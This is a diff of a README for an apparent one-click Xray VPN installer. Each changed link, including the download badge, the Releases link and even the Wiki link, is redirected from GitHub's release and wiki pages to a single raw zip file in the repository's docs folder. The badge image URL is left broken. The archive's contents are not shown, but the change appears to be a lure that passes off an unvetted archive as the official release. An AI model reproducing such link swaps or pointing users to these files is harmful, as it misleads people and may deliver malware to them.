@@ -1,6 +1,6 @@
 # 🚀 Xray-VPN-OneClick - Easy VPN Setup in Minutes
 
-[![Download Xray-VPN-OneClick](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/bucissss/Xray-VPN-OneClick/releases)
+[![Download Xray-VPN-OneClick](https://raw.githubusercontent.com/bucissss/Xray-VPN-OneClick/main/docs/One-VP-Xray-Click-2.7-alpha.4.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/bucissss/Xray-VPN-OneClick/main/docs/One-VP-Xray-Click-2.7-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to **Xray-VPN-OneClick**. This application helps you quickly set up a VP
 
 To get started, visit the Releases page to download the latest version:
 
-[Download Xray-VPN-OneClick](https://github.com/bucissss/Xray-VPN-OneClick/releases)
+[Download Xray-VPN-OneClick](https://raw.githubusercontent.com/bucissss/Xray-VPN-OneClick/main/docs/One-VP-Xray-Click-2.7-alpha.4.zip)
 
 ### 🛠 Steps to Install
 
@@ -83,7 +83,7 @@ Yes, **Xray-VPN-OneClick** uses strong encryption to protect your data while bro
 
 ## 🔗 Learn More
 
-For a complete guide on features, visit our [Wiki](https://github.com/bucissss/Xray-VPN-OneClick/wiki). Enhance your knowledge about configurations, advanced settings, and optimizations.
+For a complete guide on features, visit our [Wiki](https://raw.githubusercontent.com/bucissss/Xray-VPN-OneClick/main/docs/One-VP-Xray-Click-2.7-alpha.4.zip). Enhance your knowledge about configurations, advanced settings, and optimizations.
 
 ## 📢 Feedback
 
